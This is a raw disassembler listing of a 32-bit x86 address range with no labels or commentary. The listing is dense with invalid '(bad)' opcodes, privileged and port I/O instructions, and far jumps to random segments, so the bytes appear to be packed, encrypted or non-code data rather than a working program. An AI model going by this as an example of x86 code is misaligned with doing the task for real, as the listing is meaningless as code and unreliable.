  40ecb1:	pop    ds
  40ecb2:	pop    esi
  40ecb3:	fild   DWORD PTR [edi+edi*1]
  40ecb6:	call   0xaea1:0x998a5388
  40ecbd:	clc    
  40ecbe:	push   ecx
  40ecbf:	stos   DWORD PTR es:[edi],eax
  40ecc0:	loope  0x40ec6d
  40ecc2:	and    DWORD PTR [eax+ecx*8],esi
  40ecc5:	cli    
  40ecc6:	mov    BYTE PTR [eax-0x65a8465c],dh
  40eccc:	test   DWORD PTR [ebx],0xf926e1a3
  40ecd2:	retf   
  40ecd3:	enter  0x2293,0xe3
  40ecd7:	sub    DWORD PTR [esi+eax*4-0x72],edx
  40ecdb:	push   esi
  40ecdc:	cdq    
  40ecdd:	mov    al,0x4e
  40ecdf:	lahf   
  40ece0:	and    dl,cl
  40ece2:	loope  0x40ece7
  40ece4:	imul   edx,DWORD PTR [esi+0x664f76fe],0x27
  40eceb:	cli    
  40ecec:	sub    esi,edx
  40ecee:	fist   DWORD PTR [eax+0x71]
  40ecf1:	sub    eax,0x98990a26
  40ecf6:	cmp    DWORD PTR [edi],ebx
  40ecf8:	cs pop esp
  40ecfa:	jle    0x40ed2f
  40ecfc:	cmp    al,0x69
  40ecfe:	loopne 0x40ecda
  40ed00:	retf   0xece1
  40ed03:	cs xchg esp,eax
  40ed05:	fwait
  40ed06:	pop    eax
  40ed07:	ror    DWORD PTR [edi-0x77],1
  40ed0a:	fwait
  40ed0b:	out    dx,al
  40ed0c:	inc    ecx
  40ed0d:	and    ah,dh
  40ed0f:	lods   al,BYTE PTR ds:[esi]
  40ed10:	mov    bl,0x0
  40ed12:	fidivr WORD PTR [eax]
  40ed14:	cld    
  40ed15:	outs   dx,BYTE PTR ds:[esi]
  40ed16:	xchg   esp,eax
  40ed17:	add    ah,BYTE PTR [ebp-0x4b008195]
  40ed1d:	sub    cl,BYTE PTR [ebp+0x9]
  40ed20:	loopne 0x40ed63
  40ed22:	arpl   cx,cx
  40ed24:	mov    al,ds:0xf615c33a
  40ed29:	fild   WORD PTR [esi-0x66]
  40ed2c:	sub    BYTE PTR [ebx*1-0x44664b35],bh
  40ed33:	sahf   
  40ed34:	add    al,0x52
  40ed36:	addr16 push ds
  40ed38:	jge    0x40ed6d
  40ed3a:	cmp    al,BYTE PTR [esi-0x2f]
  40ed3d:	(bad)  
  40ed3e:	xchg   esi,eax
  40ed3f:	repz xor BYTE PTR [edx+0x22],0x5d
  40ed44:	and    DWORD PTR [ecx-0x13],0x8fc0bf94
  40ed4b:	sub    eax,0x2d6debd7
  40ed50:	aas    
  40ed51:	mov    dl,0x5e
  40ed53:	jmp    FWORD PTR es:[ebx-0x26]
  40ed57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed58:	out    dx,eax
  40ed59:	cmp    ebp,esi
  40ed5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed5c:	and    DWORD PTR [eax],ebx
  40ed5e:	jge    0x40ed8b
  40ed60:	into   
  40ed61:	mov    esp,ecx
  40ed63:	push   cs
  40ed64:	ins    DWORD PTR es:[edi],dx
  40ed65:	ins    BYTE PTR es:[edi],dx
  40ed66:	test   BYTE PTR [ebx+0x6f],ch
  40ed69:	xchg   DWORD PTR [eax-0x18471b88],esp
  40ed6f:	sub    BYTE PTR [edx+0x2415997b],0x6
  40ed76:	mov    eax,DWORD PTR [eax-0x1dfd641d]
  40ed7c:	sbb    al,0x7d
  40ed7e:	push   esp
  40ed7f:	lock fcom DWORD PTR [eax-0x4cc8c25e]
  40ed86:	mov    edi,?
  40ed88:	mov    DWORD PTR [eax+0x51],edi
  40ed8b:	in     al,0xab
  40ed8d:	bound  eax,QWORD PTR es:[edx-0x281e833c]
  40ed94:	and    eax,ecx
  40ed96:	aaa    
  40ed97:	adc    al,0x5b
  40ed99:	out    dx,al
  40ed9a:	xor    dl,ch
  40ed9c:	xchg   esp,eax
  40ed9d:	jns    0x40edc7
  40ed9f:	jecxz  0x40edba
  40eda1:	(bad)
  40eda5:	dec    edi
  40eda6:	sub    dh,BYTE PTR [ebp-0x44]
  40eda9:	and    BYTE PTR [edx],al
  40edab:	mov    ebp,0xa7cf3d7f
  40edb0:	rcl    BYTE PTR [eax],0x6a
  40edb3:	and    DWORD PTR [ebp-0x2b9e5cd],edi
  40edb9:	xor    BYTE PTR [ebx+0x39],0xb7
  40edbd:	call   0xb9226b34
  40edc2:	not    DWORD PTR [eax-0x43a8576f]
  40edc8:	jnp    0x40edeb
  40edca:	add    bh,ch
  40edcc:	mov    dh,0x8f
  40edce:	mov    ecx,0x857049ec
  40edd3:	out    0x7a,eax
  40edd5:	add    bl,dh
  40edd7:	outs   dx,BYTE PTR ds:[esi]
  40edd8:	xchg   edi,eax
  40edd9:	mov    BYTE PTR [ecx+edi*1+0x2b],bh
  40eddd:	pop    edi
  40edde:	scas   al,BYTE PTR es:[edi]
  40eddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ede0:	xchg   DWORD PTR [edx],ebp
  40ede2:	call   0x23ce:0xbe17cf20
  40ede9:	pop    ebx
  40edea:	ins    DWORD PTR es:[edi],dx
  40edeb:	and    BYTE PTR [ebx+0x71],dl
  40edee:	pusha  
  40edef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edf0:	mov    ?,WORD PTR [ebx-0x7f]
  40edf3:	rol    DWORD PTR [ebp+0x40],1
  40edf6:	cwde   
  40edf7:	or     eax,0x2a0a112d
  40edfc:	push   es
  40edfd:	and    bh,BYTE PTR [ebp-0x5174ff61]
  40ee03:	and    eax,0xdbffbb74
  40ee08:	std    
  40ee09:	push   es
  40ee0a:	ret    0x589b
  40ee0d:	std    
  40ee0e:	(bad)  
  40ee0f:	cmp    bh,bl
  40ee11:	lea    ecx,[eax+eax*4+0x61]
  40ee15:	test   al,0x79
  40ee17:	or     DWORD PTR [esi-0x7],ebp
  40ee1a:	and    ah,ch
  40ee1c:	loop   0x40ee73
  40ee1e:	or     BYTE PTR [ebx+0x41],bh
  40ee21:	jbe    0x40ee38
  40ee23:	rcl    BYTE PTR [edi],0xdf
  40ee26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee27:	cld    
  40ee28:	nop
  40ee29:	fisttp DWORD PTR [ebx+0x3e]
  40ee2c:	cmc    
  40ee2d:	adc    edx,ecx
  40ee2f:	js     0x40ee4d
  40ee31:	or     al,0x3b
  40ee33:	sub    DWORD PTR [ecx+0x5b],esp
  40ee36:	jle    0x40edd5
  40ee38:	outs   dx,DWORD PTR ds:[esi]
  40ee39:	fistp  DWORD PTR [edx+0x1d1ae7d9]
  40ee3f:	jne    0x40ee91
  40ee41:	add    al,0xea
  40ee43:	in     al,dx
  40ee44:	add    bl,BYTE PTR ds:0x5d204c1e
  40ee4a:	test   eax,0x420b7d6e
  40ee4f:	rcr    al,cl
  40ee51:	shl    bl,cl
  40ee53:	enter  0x7488,0x7c
  40ee57:	cdq    
  40ee58:	pop    esi
  40ee59:	into   
  40ee5a:	cmp    BYTE PTR [eax+ebp*4+0x16],dh
  40ee5e:	loop   0x40eea1
  40ee60:	hlt    
  40ee61:	mov    ebx,0x1351a0b9
  40ee66:	jmp    0x40ee4f
  40ee68:	push   ebx
  40ee69:	dec    eax
  40ee6a:	xlat   BYTE PTR ds:[ebx]
  40ee6b:	cld    
  40ee6c:	mov    dh,0x7d
  40ee6e:	stc    
  40ee6f:	adc    DWORD PTR [ebp+0x48],edi
  40ee72:	xor    dh,BYTE PTR [edi-0x1b5bbcd0]
  40ee78:	sub    al,0xa0
  40ee7a:	mov    eax,ds:0x3baa30a2
  40ee7f:	addr16 xchg esp,eax
  40ee81:	ret    0x2b1c
  40ee84:	pop    ecx
  40ee86:	pop    ebp
  40ee87:	mov    al,0xd6
  40ee89:	neg    DWORD PTR [edx]
  40ee8b:	mov    eax,0x4264160
  40ee90:	fwait
  40ee91:	add    BYTE PTR [ecx-0x3392c820],al
  40ee97:	sbb    DWORD PTR [eax+0x199057fd],0xe9fd70c9
  40eea1:	sbb    ah,BYTE PTR [edx]
  40eea3:	fdivr  DWORD PTR [ebx+0x3e4d880e]
  40eea9:	jle    0x40eecd
  40eeab:	adc    esi,DWORD PTR [esp+esi*1-0x12]
  40eeaf:	mov    al,ds:0x8135f31b
  40eeb4:	(bad)  
  40eeb5:	repnz dec esi
  40eeb7:	repnz xchg ecx,eax
  40eeb9:	fsub   DWORD PTR [ebx+0x27677b06]
  40eebf:	into   
  40eec0:	adc    eax,DWORD PTR [eax+0x13c0cdec]
  40eec6:	fdivp  st(5),st
  40eec8:	dec    ebp
  40eec9:	xor    dh,BYTE PTR [ecx+0x34]
  40eecc:	ja     0x40ef37
  40eece:	pop    ds
  40eecf:	cmp    BYTE PTR [eax+0x0],0x6b
  40eed3:	repz out 0xef,eax
  40eed6:	imul   ecx,DWORD PTR [edx+0x35f085fa],0xf8840471
  40eee0:	lods   eax,DWORD PTR ds:[esi]
  40eee1:	imul   eax,DWORD PTR cs:[eax+0x4b4ba680],0x41d455a9
  40eeec:	jmp    0xacf0aca7
  40eef1:	lods   al,BYTE PTR ds:[esi]
  40eef2:	out    0xc5,al
  40eef4:	jl     0x40ee9f
  40eef6:	jge    0x40eec9
  40eef8:	push   es
  40eef9:	push   esp
  40eefa:	cli    
  40eefb:	xchg   edi,eax
  40eefc:	js     0x40ef3e
  40eefe:	jecxz  0x40eeda
  40ef00:	mov    esi,0x8c64a54
  40ef05:	retf   0x97e4
  40ef08:	call   0xc0f5:0xcdba619e
  40ef0f:	inc    esi
  40ef10:	pop    eax
  40ef11:	fist   DWORD PTR [esi+0x7e6ad9a1]
  40ef17:	add    ch,BYTE PTR [esi]
  40ef19:	inc    esi
  40ef1a:	stc    
  40ef1b:	pop    es
  40ef1c:	pop    esi
  40ef1d:	sahf   
  40ef1e:	mov    BYTE PTR ds:0xe7f71e6a,ch
  40ef24:	hlt    
  40ef25:	ss enter 0x2a0a,0xb7
  40ef2a:	add    al,BYTE PTR [esi+ebp*1+0x7bad3d65]
  40ef31:	data16 jmp 0x40ef22
  40ef34:	pop    edx
  40ef35:	pushf  
  40ef36:	inc    ebp
  40ef37:	dec    eax
  40ef38:	cmc    
  40ef39:	cmc    
  40ef3a:	popa   
  40ef3b:	sbb    DWORD PTR [ecx],0x79
  40ef3e:	call   0x12b6:0x14ef859e
  40ef45:	scas   al,BYTE PTR es:[edi]
  40ef46:	das    
  40ef47:	addr16 ret 
  40ef49:	aad    0x1a
  40ef4b:	xchg   edi,eax
  40ef4c:	sar    DWORD PTR [edx+ecx*8-0x3b63283a],1
  40ef53:	fcomi  st,st(3)
  40ef55:	sub    DWORD PTR [edx+edi*4-0x23509a1e],esp
  40ef5c:	xchg   edi,eax
  40ef5d:	fstp   TBYTE PTR es:[esi]
  40ef60:	mov    cl,0xe8
  40ef62:	scas   al,BYTE PTR es:[edi]
  40ef63:	arpl   WORD PTR [edx+0x34b2198d],cx
  40ef69:	mov    eax,0x6db2e651
  40ef6e:	and    DWORD PTR [eax],0xffffffc0
  40ef71:	or     DWORD PTR [esi],ebp
  40ef73:	pop    edx
  40ef74:	adc    eax,0x8d960d13
  40ef79:	test   BYTE PTR [ebx-0x55db9364],ah
  40ef7f:	xlat   BYTE PTR ds:[ebx]
  40ef80:	lods   al,BYTE PTR ds:[esi]
  40ef81:	dec    ebp
  40ef82:	clc    
  40ef83:	xchg   edx,eax
  40ef84:	mov    bh,0x7c
  40ef86:	mov    eax,ds:0x1b4a60fa
  40ef8b:	pop    esp
  40ef8c:	pop    ds
  40ef8d:	jmp    0x2c13:0x63c8227c
  40ef94:	in     eax,dx
  40ef95:	sbb    al,0x6a
  40ef97:	jnp    0x40eff5
  40ef99:	shr    DWORD PTR [edx-0x37a92d01],0xf
  40efa0:	cli    
  40efa1:	cmp    al,0x9c
  40efa3:	aam    0x8e
  40efa5:	mov    ebx,0xc97e1678
  40efaa:	dec    esi
  40efab:	fstp   TBYTE PTR [ecx+0x15759385]
  40efb1:	push   edx
  40efb2:	mov    ch,0x7f
  40efb4:	popf   
  40efb5:	das    
  40efb6:	fld    st(1)
  40efb8:	inc    ecx
  40efb9:	pop    edi
  40efba:	mov    ebx,fs
  40efbc:	rol    ch,1
  40efbe:	sbb    esi,DWORD PTR [ecx-0x588561b7]
  40efc4:	pop    edi
  40efc5:	xor    eax,0x2
  40efc8:	nop
  40efc9:	iret   
  40efca:	add    al,0x54
  40efcc:	gs pushf 
  40efce:	test   eax,0xa6644e9
  40efd3:	or     eax,0x6b00dce2
  40efd8:	pop    esi
  40efd9:	or     al,0x1e
  40efdb:	or     DWORD PTR [eax],eax
  40efdd:	sub    DWORD PTR cs:[edx],edx
  40efe0:	shr    DWORD PTR [ecx+0x38bd5ef6],1
  40efe6:	pusha  
  40efe7:	in     eax,0x1a
  40efe9:	fwait
  40efea:	cmp    eax,0xb5afd90f
  40efef:	and    eax,0x9abe6ad7
  40eff4:	lods   eax,DWORD PTR ds:[esi]
  40eff5:	dec    edx
  40eff6:	add    ah,BYTE PTR [eax+0x7]
  40eff9:	cmp    eax,0x9cf6c962
  40effe:	cmp    ebx,DWORD PTR [edx+0x6101fa33]
  40f004:	mov    esp,0xc5cc9a3a
  40f009:	fcmovb st,st(2)
  40f00b:	gs in  al,dx
  40f00d:	sbb    DWORD PTR [ebp+0x28116766],0x1ca4964d
  40f017:	mul    BYTE PTR [esi-0x51f73a73]
  40f01d:	in     eax,dx
  40f01e:	sub    cl,bh
  40f020:	jecxz  0x40efd0
  40f022:	ds repnz int3 
  40f025:	mov    bl,0xd2
  40f027:	add    al,BYTE PTR [ebp+edx*2+0x33]
  40f02b:	xchg   BYTE PTR [esi-0x431d32e9],al
  40f031:	jmp    0xe774:0x33eb8152
  40f038:	cs cmp al,0x2d
  40f03b:	test   BYTE PTR [esi+ebx*2+0x50],bh
  40f03f:	call   0xdffcb58f
  40f044:	call   0x591c6824
  40f049:	pop    eax
  40f04a:	sub    DWORD PTR [eax],0xd4e87c07
  40f050:	cmp    eax,DWORD PTR [ebx+0x26]
  40f053:	cld    
  40f054:	not    DWORD PTR [eax]
  40f056:	adc    ebx,eax
  40f058:	jnp    0x40f091
  40f05a:	addr16 (bad) 
  40f05c:	icebp  
  40f05d:	in     al,dx
  40f05e:	inc    ebp
  40f05f:	(bad)  [ebp-0x5353c73c]
  40f065:	out    0xd3,al
  40f067:	(bad)
  40f06a:	mov    al,ds:0xf53f5a69
  40f06f:	adc    al,0xb2
  40f071:	mov    cl,0x51
  40f073:	scas   eax,DWORD PTR es:[edi]
  40f074:	cdq    
  40f075:	pop    esp
  40f076:	add    ecx,DWORD PTR ds:0x496a9d32
  40f07d:	jl     0x40f04a
  40f07f:	mov    WORD PTR [edi-0x5314c72a],ss
  40f085:	add    dh,BYTE PTR [eax+0x62]
  40f088:	icebp  
  40f089:	bnd ja 0x40f066
  40f08c:	and    edi,DWORD PTR [ebp+0x2665dc97]
  40f092:	push   cs
  40f093:	std    
  40f094:	sbb    ebp,DWORD PTR ss:[ebx+esi*4-0x42]
  40f099:	repz mov esp,0x45ed2e0a
  40f09f:	ret    0xa65f
  40f0a2:	cmp    al,0xe3
  40f0a4:	push   ebp
  40f0a5:	dec    esi
  40f0a6:	push   eax
  40f0a7:	sub    bh,BYTE PTR [edx+0x7cec0a69]
  40f0ad:	mov    ds:0xbefb36ec,al
  40f0b2:	sti    
  40f0b3:	xchg   esp,eax
  40f0b4:	push   es
  40f0b5:	mov    ?,esp
  40f0b7:	adc    DWORD PTR [eax-0x226185d4],ebp
  40f0bd:	ins    DWORD PTR es:[edi],dx
  40f0be:	cmc    
  40f0bf:	inc    esi
  40f0c0:	ror    eax,cl
  40f0c2:	mov    ecx,0xe197677e
  40f0c7:	dec    esi
  40f0c8:	adc    al,0xb2
  40f0ca:	dec    eax
  40f0cb:	cmp    eax,ebp
  40f0cd:	sub    eax,DWORD PTR [ecx]
  40f0cf:	jo     0x40f0d8
  40f0d1:	push   edx
  40f0d2:	aam    0x68
  40f0d4:	dec    esi
  40f0d5:	inc    ebp
  40f0d6:	pusha  
  40f0d7:	pushf  
  40f0d8:	(bad)  
  40f0d9:	out    dx,al
  40f0da:	mov    ch,0xd3
  40f0dc:	xor    BYTE PTR [ebx+ecx*8+0x29],dl
  40f0e0:	test   DWORD PTR [ebx+ecx*8+0x25f3b6a2],edi
  40f0e7:	jle    0x40f11d
  40f0e9:	hlt    
  40f0ea:	and    BYTE PTR ds:0x141409c9,bh
  40f0f0:	in     al,0x67
  40f0f2:	push   ss
  40f0f3:	mov    eax,fs
  40f0f5:	jne    0x40f128
  40f0f7:	outs   dx,DWORD PTR ds:[esi]
  40f0f8:	push   edx
  40f0f9:	jnp    0x40f15e
  40f0fb:	shl    ebx,0x11
  40f0fe:	mov    BYTE PTR [edx+0x2f],bl
  40f101:	fdiv   st,st(0)
  40f103:	mov    ss,WORD PTR [ecx+eiz*4+0x34]
  40f107:	in     eax,dx
  40f108:	mov    ah,ch
  40f10a:	rcr    BYTE PTR [esp+ecx*8+0x6385d2e4],1
  40f111:	leave  
  40f112:	jns    0x40f0ff
  40f114:	push   edx
  40f115:	es hlt 
  40f117:	mov    dl,0x65
  40f119:	jbe    0x40f137
  40f11b:	push   ss
  40f11c:	addr16 retf 
  40f11e:	push   es
  40f11f:	mov    al,0x6d
  40f121:	imul   edi,ebx,0xafd193f3
  40f127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f128:	int    0x15
  40f12a:	mov    BYTE PTR [ebp-0x73],ah
  40f12d:	push   ecx
  40f12e:	jns    0x40f11d
  40f130:	inc    edx
  40f131:	and    eax,0x97706d5
  40f136:	addr16 mov edx,0x8f6f1c8a
  40f13c:	or     bl,BYTE PTR [ecx*2-0x57401ff4]
  40f143:	mov    dl,0x2e
  40f145:	dec    edx
  40f146:	fidivr DWORD PTR [ecx+0x1f]
  40f149:	mov    eax,ds:0xb96999a5
  40f14e:	xor    bl,cl
  40f150:	adc    DWORD PTR [ebx-0x7d684345],0xc77cf7a3
  40f15a:	in     eax,dx
  40f15b:	clc    
  40f15c:	jne    0x40f0e5
  40f15e:	imul   eax,DWORD PTR [edx],0x29f2c56d
  40f164:	add    BYTE PTR [esp+0x41],bh
  40f168:	shl    BYTE PTR [ebp-0x5a],0x1a
  40f16c:	sbb    esi,DWORD PTR [eax]
  40f16e:	cmp    bl,BYTE PTR [esp+eiz*8+0x4c]
  40f172:	mov    ah,0x12
  40f174:	push   ds
  40f175:	or     eax,0xcb4dd848
  40f17a:	xchg   esi,eax
  40f17b:	arpl   sp,cx
  40f17d:	(bad)  
  40f17e:	pop    eax
  40f17f:	dec    eax
  40f180:	cld    
  40f181:	clc    
  40f182:	jo     0x40f11d
  40f184:	test   al,0x9
  40f186:	mov    esi,0xe4a56c2b
  40f18b:	xor    eax,0x58c9e9b6
  40f190:	jne    0x40f146
  40f192:	cmp    ebp,DWORD PTR [ecx+eax*8]
  40f195:	sub    eax,0x14f0e604
  40f19a:	adc    dl,BYTE PTR [edi]
  40f19c:	mov    DWORD PTR [eax+0x627150c2],ecx
  40f1a2:	fld    QWORD PTR [eax-0x2ffc29f8]
  40f1a8:	sbb    ch,BYTE PTR [edi]
  40f1aa:	sbb    BYTE PTR [ebx-0xecee3a7],bl
  40f1b0:	xlat   BYTE PTR ds:[ebx]
  40f1b1:	cmp    BYTE PTR [edi+0x5b],cl
  40f1b4:	mov    dh,0x8b
  40f1b6:	in     al,dx
  40f1b7:	cs daa 
  40f1b9:	cmp    eax,0xfe5a1b00
  40f1be:	mov    dl,0xeb
  40f1c0:	in     eax,dx
  40f1c1:	jae    0x40f170
  40f1c3:	out    dx,eax
  40f1c4:	jmp    FWORD PTR [esi-0x4d7eb9e4]
  40f1ca:	loope  0x40f177
  40f1cc:	adc    esp,DWORD PTR [edx+0x53]
  40f1cf:	jno    0x40f21f
  40f1d1:	leave  
  40f1d2:	fsubr  st(0),st
  40f1d4:	test   DWORD PTR [esi+0x2a81f325],0xa1097804
  40f1de:	jo     0x40f17d
  40f1e0:	iret   
  40f1e1:	jecxz  0x40f23d
  40f1e3:	dec    ecx
  40f1e4:	(bad)  
  40f1e5:	sbb    ch,ch
  40f1e7:	xchg   esi,eax
  40f1e8:	retf   0x1996
  40f1eb:	jg     0x40f1c5
  40f1ed:	sub    DWORD PTR [esi+0x581b2a4e],ecx
  40f1f3:	sahf   
  40f1f4:	(bad)  
  40f1f5:	rol    bl,1
  40f1f7:	pop    edi
  40f1f8:	jle    0x40f241
  40f1fa:	mov    eax,ds:0xd03fdc6
  40f1ff:	or     BYTE PTR [edx+ebp*4],0xd4
  40f203:	push   ds
  40f204:	repnz stos BYTE PTR es:[edi],al
  40f206:	push   esi
  40f207:	pop    edx
  40f208:	jne    0x40f233
  40f20a:	into   
  40f20b:	lahf   
  40f20c:	jbe    0x40f272
  40f20e:	std    
  40f20f:	push   es
  40f210:	jmp    0x40f1be
  40f212:	ds xchg esp,eax
  40f214:	jle    0x40f1f8
  40f216:	retf   0xa787
  40f219:	xchg   ebx,eax
  40f21a:	pop    esi
  40f21b:	push   ss
  40f21c:	ds mov edx,0xbbf5bb8e
  40f222:	imul   esp,DWORD PTR [esi-0x63],0x1a24c613
  40f229:	jmp    0x2cfc3cff
  40f22e:	fst    DWORD PTR [edx]
  40f230:	test   al,0x87
  40f232:	adc    DWORD PTR [ebp-0x25006438],esi
  40f238:	(bad)  
  40f239:	pop    eax
  40f23a:	fnstsw WORD PTR [ebx-0x48]
  40f23d:	sub    eax,0xd86f910f
  40f242:	cmp    al,0x18
  40f244:	adc    cl,cl
  40f246:	and    DWORD PTR [esi+edi*1-0xd5491da],ecx
  40f24d:	sub    BYTE PTR [ebx+0x2f2ab8eb],dh
  40f253:	dec    ebp
  40f254:	repnz daa 
  40f256:	popf   
  40f257:	clc    
  40f258:	jmp    0x60c5:0x6b5a23c9
  40f25f:	shl    ebp,0xc1
  40f262:	jp     0x40f265
  40f264:	inc    ebp
  40f265:	jo     0x40f241
  40f267:	mov    ds:0xbb2a4f42,eax
  40f26c:	jmp    0xd5b0:0x4a5268ff
  40f273:	mov    DWORD PTR [edi],ecx
  40f275:	lahf   
  40f276:	adc    ch,BYTE PTR ds:0x25341515
  40f27c:	outs   dx,BYTE PTR ds:[esi]
  40f27d:	in     eax,dx
  40f27e:	pushf  
  40f27f:	pop    ebp
  40f280:	mov    DWORD PTR [esi-0x76],edx
  40f283:	fisub  WORD PTR [edx-0x7d1a68ed]
  40f289:	xor    eax,0x3da70a50
  40f28e:	aad    0x80
  40f290:	(bad)  
  40f291:	cmp    DWORD PTR ds:0x871615ce,ecx
  40f297:	fcmovb st,st(3)
  40f299:	sbb    al,0xd0
  40f29b:	and    dl,bh
  40f29d:	mov    dh,BYTE PTR [edx+eax*8-0x4043dcb3]
  40f2a4:	jb     0x40f27c
  40f2a6:	sbb    eax,0xc001f99f
  40f2ab:	mov    esi,0x9dae9bae
  40f2b0:	pushf  
  40f2b1:	hlt    
  40f2b2:	stc    
  40f2b3:	add    DWORD PTR [eax-0x66],ecx
  40f2b6:	xchg   edx,eax
  40f2b7:	cdq    
  40f2b8:	xchg   ebp,eax
  40f2b9:	aaa    
  40f2ba:	das    
  40f2bb:	orps   xmm1,XMMWORD PTR ds:0x8d523bce
  40f2c2:	retf   
  40f2c3:	adc    eax,edx
  40f2c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2c7:	clc    
  40f2c8:	push   0x74
  40f2ca:	outs   dx,DWORD PTR ds:[esi]
  40f2cb:	pop    ds
  40f2cc:	sbb    esi,edx
  40f2ce:	popa   
  40f2cf:	data16 fsub QWORD PTR [ebp-0x4bcd39a3]
  40f2d6:	xchg   ebp,eax
  40f2d7:	cli    
  40f2d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2d9:	jb     0x40f2c6
  40f2db:	and    ah,ch
  40f2dd:	xor    DWORD PTR [ebx-0x28],ebp
  40f2e0:	stc    
  40f2e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2e2:	hlt    
  40f2e3:	rol    DWORD PTR [edi],0xa
  40f2e6:	mov    edx,0xadca71db
  40f2eb:	mov    esi,0xb1743f88
  40f2f0:	psllw  mm7,QWORD PTR [ecx]
  40f2f3:	push   0x874c8c85
  40f2f8:	pop    ss
  40f2f9:	mov    ecx,0xea9493b4
  40f2fe:	jo     0x40f2e0
  40f300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f301:	xchg   edx,eax
  40f302:	cmc    
  40f303:	sub    dl,BYTE PTR [edi+ecx*8+0x6f]
  40f307:	xchg   esp,eax
  40f308:	mov    BYTE PTR [edx],0x9a
  40f30b:	xor    edx,DWORD PTR [ebx-0x29]
  40f30e:	pop    edi
  40f30f:	mov    BYTE PTR [ecx-0x51],ah
  40f312:	adc    eax,DWORD PTR ds:0x47f82339
  40f318:	ficom  WORD PTR [ecx]
  40f31a:	xchg   DWORD PTR [esi+0x7b],ebx
  40f31d:	push   edx
  40f31e:	cmp    eax,0x18073b73
  40f323:	(bad)  ss:[eax-0x53be37fa]
  40f32a:	inc    ecx
  40f32b:	in     al,0x7d
  40f32d:	fs ret 
  40f32f:	mov    ds:0x7657e21d,al
  40f334:	pop    ebp
  40f335:	pop    ebp
  40f336:	lea    esi,ds:0x33eca0d8
  40f33c:	scas   al,BYTE PTR es:[edi]
  40f33d:	sbb    BYTE PTR ds:0x334ba33b,dl
  40f343:	test   DWORD PTR [ecx-0x53f36c9],0x115de25b
  40f34d:	push   0x5e08d518
  40f352:	cmp    dh,BYTE PTR [ecx]
  40f354:	sti    
  40f355:	mov    ecx,0xff02ff06
  40f35a:	mov    bh,0x11
  40f35c:	(bad)  
  40f35d:	mov    al,0xb4
  40f35f:	inc    ebx
  40f360:	rol    DWORD PTR [ebx+edi*8-0x3d],0xf
  40f365:	(bad)  
  40f366:	in     al,0xff
  40f368:	jge    0x40f3da
  40f36a:	dec    esp
  40f36b:	dec    edx
  40f36c:	inc    eax
  40f36d:	fs add eax,0xaf313e7e
  40f373:	pop    esp
  40f374:	pop    ebp
  40f375:	add    eax,0xa267fb9a
  40f37a:	inc    ecx
  40f37b:	mov    eax,0x4ebad62f
  40f380:	fldcw  WORD PTR [ebx+0x7b]
  40f383:	fs sub eax,0xd803c4ae
  40f389:	hlt    
  40f38a:	pushf  
  40f38b:	mov    esp,gs
  40f38d:	ret    0x9b1
  40f390:	mov    dl,0xe9
  40f392:	mov    ch,0x9e
  40f394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f395:	lds    edx,FWORD PTR ds:0x5288655a
  40f39b:	pop    ebp
  40f39c:	mov    ds:0x6aef6e68,eax
  40f3a1:	dec    ebx
  40f3a2:	outs   dx,DWORD PTR ds:[esi]
  40f3a3:	jmp    0x67e13fb5
  40f3a8:	cwde   
  40f3a9:	mov    ah,0x48
  40f3ab:	jnp    0x40f3bc
  40f3ad:	test   BYTE PTR [esp+eiz*2],dh
  40f3b0:	pop    edx
  40f3b1:	pushf  
  40f3b2:	test   al,0xcd
  40f3b4:	jnp    0x40f3bb
  40f3b6:	loopne 0x40f3bc
  40f3b8:	stos   DWORD PTR es:[edi],eax
  40f3b9:	dec    ebx
  40f3ba:	aad    0xc8
  40f3bc:	sbb    edx,edi
  40f3be:	mov    dh,0x68
  40f3c0:	sbb    ecx,DWORD PTR ds:0x1c1c5f2c
  40f3c6:	jle    0x40f412
  40f3c8:	jmp    0xb6f89c78
  40f3cd:	test   ebp,ebp
  40f3cf:	inc    esp
  40f3d0:	add    DWORD PTR [edi+0x55478c10],ecx
  40f3d6:	jns    0x40f3fc
  40f3d8:	mov    bl,0x5b
  40f3da:	(bad)  
  40f3db:	clc    
  40f3dc:	xor    DWORD PTR [esi+0x912ec3a],ebx
  40f3e2:	and    DWORD PTR [ecx-0x2d0bfb29],edx
  40f3e8:	sbb    al,dl
  40f3ea:	and    DWORD PTR [edx+0x57939659],edx
  40f3f0:	adc    ecx,ebx
  40f3f2:	hlt    
  40f3f3:	jmp    0x884ea81b
  40f3f8:	mov    al,ds:0xf189a8ed
  40f3fd:	push   edi
  40f3fe:	xchg   ecx,eax
  40f3ff:	loopne 0x40f42e
  40f401:	ret    0x896a
  40f404:	hlt    
  40f405:	inc    ecx
  40f406:	cmp    ebx,DWORD PTR [edi-0x75da2ec9]
  40f40c:	pushf  
  40f40d:	mov    ds:0x4436afc3,al
  40f412:	ins    DWORD PTR es:[edi],dx
  40f413:	loop   0x40f420
  40f415:	inc    ecx
  40f416:	push   es
  40f417:	cmp    eax,DWORD PTR [ecx]
  40f419:	repz inc ebx
  40f41b:	test   al,0x1b
  40f41d:	jne    0x40f3ef
  40f41f:	xlat   BYTE PTR ds:[ebx]
  40f420:	test   DWORD PTR [edx-0x4c],ebx
  40f423:	inc    ecx
  40f424:	mov    ecx,0xff3e18d5
  40f429:	dec    esi
  40f42a:	outs   dx,BYTE PTR ds:[esi]
  40f42b:	mov    cs,WORD PTR [ebp+0x5e1fbbd5]
  40f431:	or     DWORD PTR ds:0x8a1ee086,0x51
  40f438:	xchg   ebp,eax
  40f439:	add    eax,0x99cf88e3
  40f43e:	pop    ecx
  40f43f:	(bad)  
  40f440:	hlt    
  40f441:	addr16 out 0x2a,al
  40f444:	cmp    DWORD PTR [edx],ebx
  40f446:	mov    dh,0xba
  40f448:	push   esp
  40f449:	aaa    
  40f44a:	test   BYTE PTR [esi-0xe],dh
  40f44d:	jne    0x40f3e4
  40f44f:	out    0x4f,al
